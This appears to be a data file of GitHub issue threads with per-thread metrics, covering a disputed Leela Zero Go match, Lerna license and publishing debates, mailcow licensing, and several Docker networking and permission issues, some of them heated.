LZ team for this match are volunteer groups in China. They even seemed to have a fancy dinner before the start of game 1 night. Seeing how five out of seven games have already been played and each game lasts between 1 to 2 hours, this would be only a few hours of renting the 8x v100. Does not seem unreasonable esp when given the context of Golaxy going on after the 7 games to play Ke Jie and the spectulation from roy777 that they were playing Ke Jie to play against their AI bot.  Scenes of Golaxy running  behind Golaxy  did you get the impression that Golaxy is run by volunteers?  Oh my mistake... I didn't know Golaxy was a company.... btw @friend not sure where you got your $42, its actually $24/hr  instance  @friend It seems that renting V100 in East Asia costs much more than in US. You may see $42 or $40 in Tokyo and Seoul.  they got bribed by glolsxy match 6 only three 1080  I think there was an operator misclick today. Leela played the ""obvious"" joseki move which according to the recent network is a 15% mistake.  @friend seriously, you have to stop reacting like a crazy tinfoil hat person without knowing anything about context or facts. If they can't have 10 1080ti for the match, so be it, they are not a rich company, they are passionate people trying to put a good show against golaxy, that's all.  prob next excuse our computer rebooted midgame cause of OS update  serious question who misclicks 2 games out of only 7 between all the misclicks, operator arriving late due to getting stuck in traffic, finding out about titanV ""not optimized"" for LZ until AFTER match already started, using only 1/2 and then only 1/3 the horsepower than its opponent, not knowing about, and not testing the tree size issue prior to game 1, and changing hardware specs every single day, using mystery networks that so far as I know have yet to be published, not publishing logs in the later games of the match.... this is very unprofessional. I could have done a better job than this without any doubt.  I was opposed to the weight of 20B. 15B before the debut 20B weighted more than 80% of the 10B win rate, hardware configuration enough to play; now the 20B to the official 15B winning rate never reached Qi Cheng, and this 60% win rate is still more than double the amount of computing to achieve The hardware that is required to use or not to defeat or even exceed 15B is too high. Did not find out this sector to reduce the use of 20B, is sent in vain.  from  @friend that translation was hard to read. apparently if I understood correctly, someone was opposed to using the combination of higher sized network like the 20block in conjunction with minimial hardware like the 3x 1080, but the advice was sent in vain because no one listened and then they lost to a misclick or aka error of the connector of the operator l My question is since this match was agreed upon, scheduled and announced in advance, how did they not make sure of securing at LEAST the same hardware as golaxy prior to starting the games? This just doesn't make sense. Edit Yes I understand they are volunteers doing it out of labor of love etc etc, but that doesn't mean they should be immune to all criticism for setting up a blotched match, and when one side is using just 30% of the resources of the other side, I call it exactly and precisely that, a blotched game.  Yes, the computation power is for sure imbalanced we know. But what can we do if we do not have such a configure, what can you do if one of volunteers is sick one day? What if the 0.13 release still has a pondering bug you didn't notice? The main point of this match is just for fun, people behind it do it for free, so why are you so mean about it? Who can guarantee to hold a match first time without any issue? If you do not like it, please do not waste your precious time watching, organize your own match instead, with whatever configuration you've got, I don't care. Talk is cheap.  @friend When LZ volunteer team decided on their own volition to schedule and then announce to the broader general public these sets of games, it set itself on the trajectory of creating certain reasonable expectations as par the course of the typical kind of Go match. Had I know ahead of time all the things that would go wrong, all the shenanigans that would be pulled, then maybe that information would have been vital to my deciding how much of my own time and attention I would like to dedicate to watching this unfold, and I‚Äôm sure the same or similar could apply to other people in the public community as well.  Once again, when they started the game with the explanation that they had tested 4xTitanV to be equal to performance of 10xGTX1080Ti, they mentioned nothing about the possibility that the rest of the games would have LZ using MUCH LESS hardware specs than its Golaxy opponent. By first giving the impression of a ‚Äòfair‚Äô match by stating that after extensive testing the 4xTitanV basically == 10x GTX1080Ti on perf parity and then only later on mid match flip flopping (for whatever reason or excuse, valid or invalid, but I call it as it is, and this was a bona fide flip flop) by using half and then 3/10th the power, this at the very least FEELS like a bait and switch in which they used a ruse to get people invested emotionally leading them to believe this would be a fair /even match and then did a roundabout by not delivering on almost every metric and standard. And now I suppose the unofficial networks used and the logs for the latter half of the games of the match will not be released to the public as well? For what reason could that be?!  @friend I don't know if someone can get ban of a github and what rules are in place, but if it was up to me you would get ban. There is a pretty big difference between giving feedback or criticism and being straight up rude and mean. At my work someone who would behave like that to their coworkers on a project would be fired.  @friend if you want to talk about ""rules"" of github then per the license and per the rules they (the volunteer LZ team) have to release the modified networks to the public afaik. It is my understanding that as of yet, they have not done so.  I'm not so much bothered about the disparity in hardware (which of course makes it unfair, but that is capitalism for you), but about the fact that settings/networks/hardware are apparently being changed mid match. This means a simple thing it was not tested properly. Before you play the match or tournament, you figure out the optimal configuration. If you are even so much as tempted to change the configuration during the games, it means you did not test properly, because what information can you possibly have gotten in that time period that invalidates your prior test for the optimal configuration? Now, given that  this match is apparently not to be taken seriously, due to the above, and it seems even operator errors stand(?!)  people are starting to lose their shit over it there's no usable info for the development of LZ due to the above and lack of transparency  I'll just close this discussion. There's no use to bother or care about this.  The license only covers distribution. ",37,2,265,0,0,225,21,y,
lerna/lerna/1628,0.058638399,lerna,lerna,Bump major version before releasing license change.,2790,39,14,0.636363636,1,"A polite and hopefully unnecessary reminder that when the license change is released it should be a major version bump. I'm imagining the fall out that would occur if this were released as a patch version and it wouldn't be pretty.  You're going to introduce a major license change, refuse to change the license name and do it in a minor version bump? What the actual hell is your goal here?  To screw with companies that support ICE, was that not clear?  By releasing a major license change as a minor version bump and using an incorrect license in the license field? You're screwing Lerna, not the companies listed. Ignoring you politicizing something that has no business being political (especially as a former Facebook employee... come on), literally every company listed is going to update their packages to pull from  and go back to work. Meanwhile you're getting massive community backlash that's only going to continue if you decide to be a child and inappropriately release this as a minor version bump or with the MIT license. The best thing feasible for Lerna at this point is you leaving the project. But since that's not going to happen since you apparently enjoy your soap box, the second best thing is everyone moving to a fork of the project without a politician having any control. The irony is I 100% agree with your politics, but this is not the place to express them.  @friend i would personally appreciate some certainty around this, because if you're likely to release this under a patch version I now need to go through all my clients' repos to make sure they're using lock files, fixed versions or a fork. Not because my clients are Microsoft et al but because they have contractually approved lists of licenses that we can use and this license will not qualify. The intent is pretty clear, but the unfortunate side effect is that it also screws with many developers who use this tool. I know this wasn't your intention but it sucks if I have to spend my evening checking a bunch of old repos because you'll maybe release this as a patch.  I left the Lerna project a long time ago, I've gone as far as to replace Lerna with a new tool called Bolt. All technology is political, open source is especially political. It would not exist if not for political reasons. Open sourcing something is in itself a political act. We'll release it as major  Once upon a time I thought I had to go work for those big corporations that I hate in order to do the kind of open source work I want to do. That turned out to be incredibly false. So I fucked off and told them to eat shit.  As long as you're maintaining the repository and represent it in the face of other contributors and open source community members - no, you did not. Maintainer is a part of a project.  Cool story ",9,7,60,0.181818182,0.181818182,48,4,y,
lerna/lerna/901,0.069235475,lerna,lerna,[Feature] Allow custom publish subdirectory,9018,106,78,0.6,9," Many libraries in the Angular ecosystem publish to NPM from a subdirectory that was cooked during the build process. The process is usually as followed - build the library in a subdirectory (i.e  directory) - copy package.json, license and readme to the  directory - do some package.json cleanups in the  directory (delete devDepedencies, move dependencies to peerDependencies, remove scripts...) - npm publish from the  directory.  I understand that it is not a common technique for node.js package developers but i think it is common for web package developers and my libraries uses the same technique..  While embedding  into our shared packages monorepo - [kaltura-ng]( I read a lot of issues in lerna and googled about this topic. I read carefully the conversation of issue #91 and even used the same subject with my issue. Unless I missed new issues that address this feature it was marked as 'wontfix' with a recommendation to use the 'package.jsonfiles' array instead.  The reasons for using this approach instead of  array are - Many known libraries in the Angular ecosystem does it ([angular/angular]( [ReactiveX/rxjs]( [cyclejs/cyclejs]( so they must have a reason. - There is a lot of hoo-ha/complexity with the way node.js resolve modules  for the **web projects** since during the bundling process you **must** refer to the same instance of the library. Unless the bundler (typescript, webpack etc...) provide a hack/workaround/solution to force the library to use its' own node_modules, it will not work. Publishing from sub-directory works just because the  not exists. - During development if the symlink is done against the root, when you import nested class which was not exported in the main index, you will need to refer to the  as part of the path . but once you publish from  folder directly, you should somehow fix the pass by removing the  during the tranpiling which is not a valid option. - The libraries being used as dependencies during development should be assigned as peerDependencies at runtime because you want the application to provide them.  so to recap, we cannot just publish the package with a  folder, we need to publish from  directly  There are some caveats that I could think about with my suggested approach 1. The dist folder must exists with a package.json inplace before the  process symlink the folders.  2. The build process should not delete the 'dist' folder, instead it should just clear its content otherwise the symlink of dependent libraries will be broken.  IMO those two caveats are manageable as 1. we can use a preinstall script to create the folder and a simple package.json file (with at least 'id','name'). 2. the build scripts should clear the folder content instead of  the folder itself.  ## Expected Behavior   when bootstrapping/publishing a package the package.json is being queried for the following config    if this config exists, it will symlink to that folder during bootstrap command and will publish from that folder during  publish command  using the 'config' attribute allow using the same configuration both in  and in other [node scripts]( already modified the 'bootstrap' command in a fork [esakal/lerna]( I didn't create a PR yet because I'm missing the 'publish' command. I will be happy to continue my work if you are going to consider this feature.  You can see it in action in our repo -  [kaltura-ng](   **NOTE** - your yarn version should be 0.24.6 and above  ## Current Behavior   n/a   ## Your Environment     Executable Version      2.0.0-rc.5    v0.24.6      OS Version     macOS El Capitan 10.11.6     Hi, I have a same problem in a project developed with a lot of Angular 4 libraries. If dist folder cant' be symlinked directly, the services don't be injected correctly. I dislike this way proposed by angular (define a package in dist). But if customization of package dir can't be defined, Lerna can't be used with an angular project.  I recently tried using Lerna for the first time and immediately ran into this issue. Any heavy Typescript development is going to get hamstrung by the omission of this NPM feature.  Same issue here I ran into this problem, would love to get this feature, I am even ready to do a PR. @friend any thoughts?  Have the same problem here, I‚Äôd love to have this feature, and I am willing to do a PR. @friend what are your thoughts?  As far as I know this is the only way to accomplish ""flat"" package structure (without the  or  section in the import path) unless skipping / directories entirely, which isn't practicable if your source requires transpilation. Let's say I want to import only the  module from the  namespace inside my , what I would like it to look like is If the source is ts/jsx/esnext etc, the recommended way of distributing the package is to transpile it to a  directory (""npmDistDirectory"" in @friend's proposal), include  and publish. This doesn't seem to be possible with lerna at this moment, which is a pity. Instead I will need to transpile it to , reference it from the  prop in  and then accept the following import After spending precious time on your API design, naming convention etc, this is a bitter tradeoff.  I don‚Äôt understand why this ‚Äúflat‚Äù package structure is better than just another npm package. ‚Äúbig-obese-monolith‚Äù packages are an anti-pattern in npm. If you want to expose submodules directly, extract them into a separate package. Literally the reason Lerna was created in the first place.  @friend I will not go into argument whether x is better than y - most often I am wrong. But if we ignore my poor choice of lorem-ipsum name (we can call it something else, such as ""tiny-lodash""), I can't really see why lerna should hinder the author from using a nested structure within a package and at the same time provide ""semantic imports"". I came here to evaluate lerna as a tool for managing JavaScript projects with multiple packages, not as a tool to limit me on how to structure the internals of my packages (whether good or bad).  In my experience, as well as observation of community packages over many years, coupling consumption of a given export to the literal directory structure of a tarball is an extremely hostile anti-pattern. Especially nowadays with ES module exports and whatnot combined with tree-shaking module bundlers, there‚Äôs really no fundamental necessity for false-basedir publishing. Lerna is designed around the way npm works. Packages are published from the same directory as the package.json, and construct their tarball from metadata contained therein. Publishing from a different directory with a modified dependency tree is not idiomatic npm, and lerna will not support it.  This will be a major limitation for TypeScript and Angular developers, and in fact some people using lerna with typescript had to do their own publish, or patch the existing implementation.  I myself want to publish from a subdirectory which does contain a  for several reasons; 1) I don't want to transpile my TS in the  folder because I'll end up having a messy file system. , , ,  all next to each other, and than to  after build will be a total mess. 2) I want to following Google's Angular Package format  Seperation of concerns, why should I have my  files within the same folder of the ? My folder structure ‚ô†bash -- my-lib ---- package.json ---- src ------ index.ts ----dist ------ package.json ------ index.d.ts ------ index.metadata.json ------ esm2015 -------- index.js ------ esm5 -------- index.js ------ bundles -------- index.js So in reality i can publish from a subfolder as I do have a  Author of several typescript modules here who has hit the exact same issue, all my modules publish from a  folder. Wish I'd known this before starting to use lerna! Would love this feature to be implemented, but will probably have to switch to something else instead now.  I fail to see what typescript has to do with this non-idiomatic subdirectory pattern. You can publish npm modules with transpiled code and typings under  just fine, no mangling of package.json required.  That won‚Äôt  work if you‚Äôd need secondary entry points like @friend/my-lib/testing On Fri, 29 Dec 2017 at 1645, Daniel Stockman notifications@friend.com wrote  For those that are still trying to get ""flat-pack"" imports working  I was able to solve it by leveraging the , , and  scripts that were added in  me I got it working by - Disabling NPM publishing during the lerna publish command  Performing my linting and build during the  NPM script (or before) which would be built into a  folder Copy necessary files into the  folder during the  NPM script and then call . This is handled in a gulp file but I've simplified below. The  version has been bumped prior to the  script being called is only called if you do not include the  command to lerna publish     I still think a config option for  could be beneficial since it would allow a consumer to leverage the  lifecycle-hook which seems a little more intuitive.  that's why angular repos not using lerna ",40,61,390,0.133333333,0.266666667,163,4,n,
mailcow-dockerized/mailcow/2465,0.086655343,mailcow,mailcow-dockerized,Updating lots of changes.,5740,66,42,0.4,6,"In my cow I have made many changes and added new options, not knowing how to best update them with a new code on GitHub, without break other users who will have this issue how will fix it. Thank.  You just stated that you don't know that's not a question; it's a statement. If your question is how to actually do this it would help to know how much experience with git-based development you have, so we can better assess on where to start explaining. If you've got enough experience andryyy's comment should help you out.  i don't think you underztond  Ok, @friend can help you out; he's the maintainer üò∏.  Actually, if you made changes to the code itself there should be an open repo (or otherwise publicly available current version of the code) of this per the license of this project. Where can we inspect this code? I see no open repositories under your GitHub account.  I think he asking how to update Mailcow if you have done lots of changes to the code, I might wrong don't want to sound rude but there seem to be a bit of language barrier.  @friend Oooh, ok. Well, as long as only configuration stuff is involved, there should be no issue updating, I think. (You should always backup anyway.) If functionality was added, he is bound by the license to make his code publicly available, though. I can't speak for @friend but in his stead I wouldn't want to support anyone who is violating the license.  Did ./update.sh it stoped working  This is the point in time where you save the logs of the update,restore your backup and show us what the logs say. Though I don't know if anyone might want to help you as long as you're violating the license.  I don't think this should break anything, but we still can't help without some diagnostic output... Follow the issue template and if you think your rspamd scores make more sense you should create a PR.  @friend I don't think adding new functionality to Mailcow would count as a license violation even if they don't release the code as long as they are not distributing it. ¬†  Please stop claiming that @friend violates the license. He's most likely not doing that. Simple stuff like the Dockerfiles and configurations is too trivial to be copyrightable, so the license mainly applies to  the scripts, web UI, etc. Besides that, the GPLv3 only requires you to provide the code if you redistribute the software (e.g. if someone started selling Mailcow for other people to run on their own servers), not if you are only running it (either for your own use or as a hosting company that provides managed Mailcow instances). This is different from the AGPLv3, which, for example, requires you to provide the code as soon as you are allowing someone to use the software over the network. These kinds of comments indeed do not help. Please provide a full explanation of your problem and all relevant logs. When you created a new issue, the template actually asked you to do precisely that.  Huh. ) Okay. Thought he wants to contribute code.  @friend @friend As stated in  is no mention that you don't need to make the code available after a modification of the code if you're only using it for yourself. Actually it suggests otherwise. That's why I didn't ever dig further into this. On the other hand we have this  means ""conveying"" here, as per the GPL  actually you're wrong. We have JavaScript as part of this repo. And now see this  we use Ajax calls the javascript part of the code is explicitly considered NOT to be trivial as per the link provided. Since you're making part of the GPL code available directly to the public just by visiting the mailcow site, you WILL have to disclose any changes to the code IMHO. Correct me with a reliable source please, if I missed something. I'm now even more confused about @friend's comment here  though üòñ.  I don't think andryyy care if someone modify or add stuff to Mailcow unless they are posting screenshot or asking for help to fix issue caused by their modification.¬†Even if andryyy did wanted ever bit of code from a user that¬† modified their Mailcow install it not like he's going to even know about it unless the person messages him saying I've modified your code you want a copy.  That's why I mentioned  where he actually asked for it.  I have close why still messageing  Did anyone teach you manners if allof (header contains ""X-GitHub-Sender"" ""Hickstead"") { discard; } that shoud keep my inbox clear of you.  I'm willing to believe there was a big language-barrier problem (maybe auto translate) and all the talk of violating licenses may have scared Hickstead, so his comment about still messaging may not have been meant the way it came across. üëç  Sorry, didn't want to scare anyone or get offtopicky. ( I'd be happy if anyone could cite something that disproves what I found out, though, just for clarity, because that's how I always interpreted Mailcow to behave in context of GPL. plus one  Your interpretation is probably a bit strict, @friend. Commonly one only insists on publishing the source code if someone provides (usually by selling) the software to someone else to run on their own computer. So all internal use is not affected. It's unclear to me whether the redistribution of the JS code also requires the publication of modifications to the server-side code. My guess is no (as the license also applies to each file individually, one can redistribute them individually), but that question can basically only be answered by a lawyer. I already locked this discussion, but since you are team members, you can continue commenting here. I just ask that we stick to the actual technical questions instead of discussing nitpicky licensing details that none of us is an expert on.  Agreed. Thanks for clarifying. plus one ",25,6,176,0,0.4,123,1,y,
miktex/MiKTeX/163,0.122428195,MiKTeX,miktex,I installed MiKTeX under win10 and the path of the bin directory is set with wrong slashes:  C:\Users\me\AppData\Local\Programs\MiKTeX 2.9\miktex/bin/x64,785,8,4,0.75,0,"Please note we will close your issue without comment if you delete, do not read or do not fill out the issue checklist below and provide all the required information. Checklist  [ ] I am reporting a bug others will be able to reproduce [ ] I have installed the latest MiKTeX updates [ ] I have checked the MiKTeX log files  Please replace this section with the required information  step-by-step reproduction instructions input files which are necessary to reproduce the bug your observations (command output, screenshots, ...) relevant log file snippets   @friend  Why is it invalid? I need a solution to this problem. There is no way to edit this path, it is set by MiKTeX...  This is an invalid report  You haven't checked the log files You didn't provide the required information  ",2,0,26,0,0,24,1,n,
minecolonies/ldtteam/2094,0.11617921,ldtteam,minecolonies,Massive log file.,938,3,41,1,0,"Minecolonies version First detection  forge-1.12.2-14.23.1.2665-universal + minecolonies-universal-1.12.2-0.8.6905 ( and other version ) Lastest test  forge-1.12.2-14.23.1.2604-universal + minecolonies-universal-1.12.2-0.8.7200 Expected behavior No log, reduct log to minimum, place a option in config file for stop log, place this log in separated file.  run /mc colonies rsResetAll in Version 1.12.2-0.8.7193 ( read in description ) Same problem. Massive LOG file. 2531 entry in one second in file fml-junk-earlystartup.log [120716] [Server thread/DEBUG] [minecolonies] Attempting to find a Factory with Primary com.minecolonies.api.colony.requestsystem.factory.FactoryVoidInput -&gt; com.minecolonies.api.colony.requestsystem.data.IRequestSystemBuildingDataStore [120716] [Server thread/DEBUG] [minecolonies] Found matching Factory for Primary input type. Log file  Reducted file from a server start to stop. fml-junk-earlystartup.log ",0,0,85,0,0,42,0,n,
moby/moby/10248,0.12358285,moby,moby,Docker embarrasing slow on execution,1687,4,62,0,3,"Running my own image on a CentOS 7 host, clean installation, no other jobs running is embarrassing slow. docker run -p 1202012020 zopyx/xmldirector-plone takes in the range 5 to 10 minutes under Docker control. Running the same code on same virtual machine usually takes less than one minute. The image starts eXist-db, pre-allocates the CMS Plone and starts it. The related Dockerfile is here  uses this as base image  the load of the VM goes over the top and climbs up to 10  [ajung@friend ~]$ uname -a Linux docker.zopyx.com 3.10.0-123.el7.x86_64 #1 SMP Mon Jun 30 120922 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux [ajung@friend ~]$ docker version Client version 1.4.1 Client API version 1.16 Go version (client) go1.3.3 Git commit (client) 5bc2ff8 OS/Arch (client) linux/amd64 Server version 1.4.1 Server API version 1.16 Go version (server) go1.3.3 Git commit (server) 5bc2ff8 [ajung@friend ~]$ docker -D info Containers 3 Images 62 Storage Driver devicemapper  Pool Name docker-2531-201327949-pool  Pool Blocksize 65.54 kB  Data file /var/lib/docker/devicemapper/devicemapper/data  Metadata file /var/lib/docker/devicemapper/devicemapper/metadata  Data Space Used 3.474 GB  Data Space Total 107.4 GB  Metadata Space Used 4.448 MB  Metadata Space Total 2.147 GB  Library Version 1.02.82-git (2013-10-04) Execution Driver native-0.2 Kernel Version 3.10.0-123.el7.x86_64 Operating System CentOS Linux 7 (Core) CPUs 3 Total Memory 3.704 GiB Name docker.zopyx.com ID 2CWZEWWZTNZTNHN7H4VEJOENPQZGXVJGAJMH2PVKJYOXE4UY Debug mode (server) false Debug mode (client) true Fds 23 Goroutines 39 EventsListeners 0 Init Path /usr/bin/docker Docker Root Dir /var/lib/docker Username zopyx Registry [",0,0,115,0,0,157,0,n,
moby/moby/16417,0.06673585,moby,moby,Would the docker community  like to accept new performance/stress/stability test cases?,816,5,6,0,0,"Currently, only functional test cases are included in the docker community. I plan to create some new performance/stress/stability test cases. For example, performance tests are as follow(included but not limited to)  CPU usage, Disk IO, network IO, TCP/IP bandwidth and latency,concurrent container quantity. Benefits are as follow. (1) They can provide docker users with performance reference. For example, a user need to deploy a server with docker. If the server's memory consumption figure is more than the benchmark data, the user can know much memory is need. (2) We can use them to track performance history data for each commit to find which patch leads to the increase or the decrease of performance data. But I wonder if the community would like to accept them. What is the attitude the docker community? ",4,0,28,0,0,24,1,n,
moby/moby/17195,0.08464951,moby,moby,Proposal: docker embedded DNS server,847,8,3,0,0,"There are numerous open issues in regards to docker and DNS handling within containers (#17190 #16619 #15978 #14627 #15819 and likely many others which I was fuzzy on) One solution I think which would solve all these issues would be if docker acted as a DNS server. It would answer lookup requests for linked containers, and when the request isn't for a linked container, it would forward it upstream (to the host's name servers). The  file inside the container would then be static, containing only the container itself. We could also not touch  at all, and leave the container's entry to DNS. This would allow image builds to manipulate the file and persist the changes. For performance, it would probably be good if docker cached the upstream DNS records. Records come back with a TTL, so docker should cache the record until this TTL expires. ",9,0,25,0,0,28,0,n,
moby/moby/18264,0.064545665,moby,moby,Using monochrome icon?,1445,21,18,0,4,"Hello, I'd like to know if is it allowed in a commercial product to use a monochrome version (for example  to refer to Docker. I'm asking this because I need to use this icon in a narrow space (about 20x20px) and the original icon when scaled down looks blurred, and, in your documentation, you ask developers to use the original icon with even the ""Docker"" text below it. Thanks.  Just as a heads up, it appears that  has been updated. There's an excellent simplified logo that looks great.  Ah, yes; I do see that there's a requirement to keep the  name in the logo, so looks like it's still not allowed (well, without written permission I guess) to use just the Whale icon &lt;img width=""471"" alt=""screen shot 2017-07-13 at 13 48 26"" src="" Too bad one can't even change the plain logo's color to white or black so it matches the hundreds of other logos legally provided for icon/footer use.  @friend sorry for that, I understand it's frustrating; also not something I can influence. There's a section that mentions exceptions - could be worth reaching out; &lt;img width=""920"" alt=""screen shot 2017-07-13 at 21 48 29"" src="" @friend Thank you for pointing that out. The best solution would be for Docker to add some of those logos to the package they provide. But I understand they wouldn't add the black and white versions because of the risk of those being used more than the ones they already provide. I'll send the email with the artwork. ",7,0,69,0,0,23,0,n,
moby/moby/18569,0.02592367,moby,moby,Docker client does not handle 401 Unauthorized response codes from registry correctly,412,0,4,0,1,"Docker (1.9.1) only checks for 401 HTTP status code on  but it will not attempt authentication on later 401 status response codes. My use case our registry needs to allow unauthenticated pulls (therefore will return 200 on ), but it requires authentication on ""push"". Docker client version 1.9.1 Used registry  client will print ""&lt;nil&gt;"" on the console instead of attempting authentication (as it should).  ",4,0,22,0,0,8,0,n,
moby/moby/22285,0.17654967,moby,moby,ISSUE: Can't get systemd to run with 1.11,410,7,7,0,1,"I've been running a few hundred containers with systemd in them since 1.7. The flags required has changed a little bit. In 1.10 I was adding , , and . With the same flags, it doesn't work in 1.11. With  it works. With  it does not work. Here's a dump of the system Thanks for the help! FYI This is the only thing I could find about the issue while Googling, and it suggests something indeed did change in 1.11 ",1,0,18,0,0,15,1,n,
moby/moby/22415,0.066813069,moby,moby,Add the ability to map containers to a user host-side,9480,94,65,0,5,"Before getting into the details, I want to point out that I suspect a feature like what I'm about to suggest could solve many permission related snags when using Docker. So as to prevent this suggestion from getting mired in philosophical objections, this ticket is not advocating permanently storing credentials inside a container.  I don't do that and I don't suggest anyone else do it either!  tldr; The current method of UID spoofing inside of a container via  has limitations that end up mandating entire ecosystems of one-offs and very problematic workarounds to massage container state into the right frame of mind.  This is worsened by the fact that the need to perform these workarounds is influenced by what platform you are calling Docker from. The feature I'd like to request is to have a flag added to  (and equivalents) that tells Docker to map all filesystem operations that a container performs to a specific user host-side.  This is very different to  which simply sets the user of the process that runs inside the container. If you're interested in an extended explanation, read on!  Rationale We've all heard about people having issues with temporarily binding SSH credentials and similar  &amp;  related difficulties. Something that I've noticed when using Docker on OSX and Windows however is that I'm actually freed from the challenges of ensuring my ephemeral development containers (my primary use case) aren't writing files to the filesystem as root!  This is owed to the fact that they both rely on a variety of bridges back to the native platform's filesystem. One non-exclusive example is when trying to forward either an SSH socket or the SSH directory on a Linux host, because SSH insists on proper home directories, I've been unable to get secure connections working without having to make my container aware of the environment it is running in!  The best I've been able to dream up is bind mounting ,  and  into the container.  Which is exactly as horrible as it sounds, but also my only choice given that I don't know what uids will be right for the host filesystem.  This clearly runs against Dockers attitudes towards portability. Another more common example would be when files are created by the container, if the bound filesystem is ext or otherwise linux-compatible, the UID of files is set to root (or whoever I run my container as).  On Linux, in order to not blast my filesystem with files having UID/GID 0, I have to tell my containers to run their processes as my current user via . This might work in trivial scenarios, but again ends up falling apart in situations where the user system inside of the container is different to the host or the binaries being run enforce  directory requirements like SSH above.  No host is likely to ever have a reliable way to influence the user system inside the container.  This is especially true when using images produced by third parties. So, I currently am stuck avoiding the complexity by staying as root.  Everything works because all containers have a root user fully configured.  But now without any better option, all Docker containers that want to avoid being polluted with hacks are forced to write files as UID 0! As I mentioned above, switch over to Windows or OSX and this problem goes away because they don't share the same users as the container and the filesystems aren't compatible.  Instead, vboxsf, samba and other drivers are actually emulating the feature I'm requesting here! So, this clearly identifies the fact that while it's nice to control who the container runs its process as, it would actually be more desirable to optionally map the uid (and gid?) flag for any changes to the filesystem from the container, host-side. All the while, still allowing the container to function as whoever it needs to be internally. This jives with the philosophy that Docker containers should be portable and require zero awareness of the environment that is running them.  Indeed if you examine the nature of this suggestion, it's conceptually parallel to binding ports and bind mounting filesystems. We need a way to bind users as well.  @friend are you are of any progress or discussion that has been around this since your post?  Nope, and I was even thinking about this issue today.  IIRC, @friend agreed with the value behind such a feature, might have been advocating for it internally (correct me if I'm wrong üòÖ). This is probably one of the more glaring oversights in the docker platform and in a strange twist, keeps me preferring to work with it on macOS/Windows instead of natively on linux! Feel free to retweet, this issue is as old as my daughter!  If the main issue is to have the ability to bind-mount files from your host into a container, then this is largely the same issue as;   User namespaces - Phase 2  Add ability to mount volume as user other than root  And comes down to the ability to remap user-ids inside the container. This might be possible with a kernel that supports shiftfs or a FUSE filesystem. @friend did some work on something in this area in  (implementing a FUSE driver to do uid/gid remapping), and in a WIP pull request to use it for userns;  Doesn't that end up requiring the container to have special setup? The idea here is that regardless of what the container chooses to do to the filesystem it sees, any writes coming out of it are abstracted to specific uid and/or gid.  It's not something that should be (or could be) enabled by default, as;  docker won't know what mapping to make (i.e. wouldn't know what local uid/gid you want to map to which uid/gid inside the container) by default ignoring/mapping uid/gid means that a non-privileged user inside the container would get full access to bind-mounted files from the host (files which could be accessible to certain users only).  For Docker Desktop (Docker for Mac / Docker for Windows), the ""ignore ownership"" feature was implemented because Docker Desktop is targeted at developer use-cases, not for production (in production situations, giving a container access to files on the host is especially not desirable)  I'm not sure I understand the distinction ~""people dev on Windows/macOS"" as I'm sure plenty of people develop on linux as well.  If that's really an explanation for the difference in behaviour, they surely need some equivalent that is easy to use. The mappings should be configured per volume.  So if I bind a volume to a container, I should be able to set a uid and/or gid that all write operations to that volume map out to on the host.  Internally the container will retain its own behaviour, but I can't have containers that write to uids and gids that might not even be configured on my host system. There is clearly a missing abstraction here.  The missing abstraction is this is simply not possible on Linux without fuse. Docker for Mac uses fuse to do this, and it's horribly slow for most use cases.  @friend - Sorry, can you elaborate?  I might not be following on that one, why would FUSE be necessary? Really, what this ticket represents applies regardless of what the current state of things is.  I don't think it's at all a stretch to say that my  and  can't possibly be expected to harmonize with every container and every permutation of them I can end up running.  Obviously the same applies for the containers own assumptions internal to themselves as well. As a practical but still contrived example If I'm running on a system and one container writes as , another uses  and another is using , they will all write as whatever the corresponding uid maps out to internally.  To the host though, those uids could end up being anything.  Worse still, between containers, you have a whole other set of permutations to deal with. To me, it seems like the only possible answer here is that we need some way during instantiation to abstract the filesystem operations that originate from within the container to the local system.  More importantly, this has to be possible without having to put that information in the containers themselves. Ideally Each container is responsible for its own security abstractions and when configured, have all operations performed on bound filesystems mapped to a specific uid/gid as defined by the host.  FUSE is required because there is no way to do these mappings at the filesystem level. See ""shiftfs"" for an attempt to bring this into the kernel generically.  Would super be nice if docker abstracted something like that.  Could we have an an option to use FUSE on Linux then? This issue causes huge amounts of problems for devs who use linux in our organisation and maintaining workarounds to let them do their jobs is irritating. I accept that there will be performance issues with that - but since we mostly use Docker for Mac that's really not a concern for us. I'd rather have ""slow and working"" over ""fast but broken"" any day.  FUSE support would be awesome!  A lot better than setting up rsync scripts which I'm doing now which is a pain.  I've also considered adding ssh service to my containers just to use sshfs to work around this issue.  I've been experimenting specifically with a filesystem for mapping UID/GID's mapped for user namespaces...  something like this might work for mapping a name in the container to a name on the host... I'd leave that to people who are interested in this. I guess we already process /etc/passwd in the container for  (but it's horrible and doesn't work for some cases). ",34,0,243,0,0,204,15,n,
moby/moby/22753,0.069196741,moby,moby,No docker0 on docker for mac?,4473,55,39,0,6,"Output of  Output of  Additional environment details (AWS, VirtualBox, physical, etc.) Steps to reproduce the issue 1. 2. 3. Describe the results you received No docker0 and absolutely no way to connect to services running on docker host via bridge gateway. I have tried it all and thought I was going crazy, then I tried exactly the same things on my ubuntu host with zero problems Describe the results you expected I would like to be able to connect to my local redis and other services without having to dockerize these...  I just wanted to add a plus one/subscribe along with everyone else in this thread, and add another voice to the feature request of being able to easily access docker containers through the bridge interface on unique/custom IP addresses. I was ramming my head into the wall for at least 4 hours trying to figure out why I couldn't get any documented examples working, until I somehow found this issue, describing the problem perfectly. For now, the workaround mentioned by @friend ( seems to work passably well. I'm adding experimental Docker support to Drupal VM using the instructions  Add a host to  with  (e.g. ) Create an alias on the loopback interface  Bring up a container with the following pseudocompose version ""3"" services app  image image-name  ports    - 192.168.1.1008080    - 192.168.1.100443443  [...]    This seems to work perfectly for me, and though it currently requires a couple manual steps (which are avoided if using other tools on top of Docker... something I don't want to force my users to do), it allows me to almost reach Docker nirvana on Mac. So thanks for the workaround, and I hope you can find a way to get the bridge network working soon (or just abandon macOS &lt; 10.12 üòè)  @friend thank you sooo much, 192.168.65.1 has solved my issue. I hope this doesn't get changed in the future, unless they find a cleaner solution. As of Docker for Mac 17.0.3.1 this has allowed my container to talk to the MySQL server running on my machine's localhost.  @friend I'm glad it worked for you. Thanks for the feedback!  Hi, I am reading the docs here  and I am trying to use the the special Mac-only DNS name mentioned there . If I do a ping on a terminal inside the docker container, it gets resolved to 192.168.65.1, and doing a curl to an app running on my mac retrieves the expected result. I am using this image  and I can open a Chrome browser there. So I wanted to go to  and the connection was refused. However, doing  works. Am I missing something? I wanted to start using the .  I think that using  was a poor decision. The whole point of containers is that they are portable and should have no dependency on what type of host they reside. If my team is half 